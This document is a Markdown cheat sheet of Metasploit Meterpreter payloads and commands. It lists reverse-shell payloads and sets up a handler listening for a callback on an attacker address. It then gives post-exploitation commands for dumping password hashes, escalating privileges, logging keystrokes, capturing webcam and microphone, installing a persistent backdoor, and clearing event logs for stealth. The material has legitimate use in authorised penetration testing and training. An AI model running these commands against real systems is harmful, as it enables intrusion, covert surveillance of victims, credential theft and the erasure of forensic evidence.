
---

## 🧪 Common Meterpreter Payloads (used with MSFvenom)


| Payload                             | Description                                    |
| ----------------------------------- | ---------------------------------------------- |
| `windows/meterpreter/reverse_tcp`   | Connects back to attacker (reverse shell)      |
| `windows/meterpreter/bind_tcp`      | Opens a port and waits for attacker to connect |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter shell for Linux systems            |
| `android/meterpreter/reverse_tcp`   | Meterpreter for Android devices                |
| `osx/x64/meterpreter_reverse_tcp`   | macOS Meterpreter payload                      |

---

## 🔗 Start Metasploit Listener

```
msfconsole
```

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run

## Meterpreter Command Reference

### System Info & Navigation

|Command|Description|
|---|---|
|`sysinfo`|Get system information|
|`getuid`|Display current user|
|`ps`|List running processes|
|`cd`, `ls`, `pwd`|Navigate the filesystem|
|`download <file>`|Download file from target|
|`upload <file>`|Upload file to target|
|`cat <file>`|Read file contents|
## Process & Session Management

|Command|Description|
|---|---|
|`migrate <pid>`|Migrate to another process|
|`background`|Background the session|
|`sessions -l`|List all active sessions|
|`sessions -i <id>`|Interact with a session|
## Privilege Escalation
|Command|Description|
|---|---|
|`getprivs`|List available privileges|
|`getsystem`|Attempt to elevate privileges|
|`run post/windows/gather/hashdump`|Dump password hashes (Windows)|
## Keylogging & Screenshots

|Command|Description|
|---|---|
|`keyscan_start`|Start keylogger|
|`keyscan_dump`|Dump keystrokes|
|`screenshot`|Take a screenshot|
## Persistence & Backdoors

|Command|Description|
|---|---|
|`persistence -X -i 30 -p 4444 -r <LHOST>`|Install persistent backdoor|
|`run persistence`|Run persistence script|
## Webcam & Microphone

|Command|Description|
|---|---|
|`webcam_list`|List available webcams|
|`webcam_snap`|Take webcam snapshot|
|`record_mic`|Record audio from mic (if supported)|
## Fileless Execution
```
use exploit/windows/smb/psexec
```

📌 Tips
Always migrate to a stable process (e.g., explorer.exe)

Use clearev to remove event logs (stealth)

Combine with meterpreter scripts or post modules for automation

## Exit and Cleanup
```
exit -y
```
























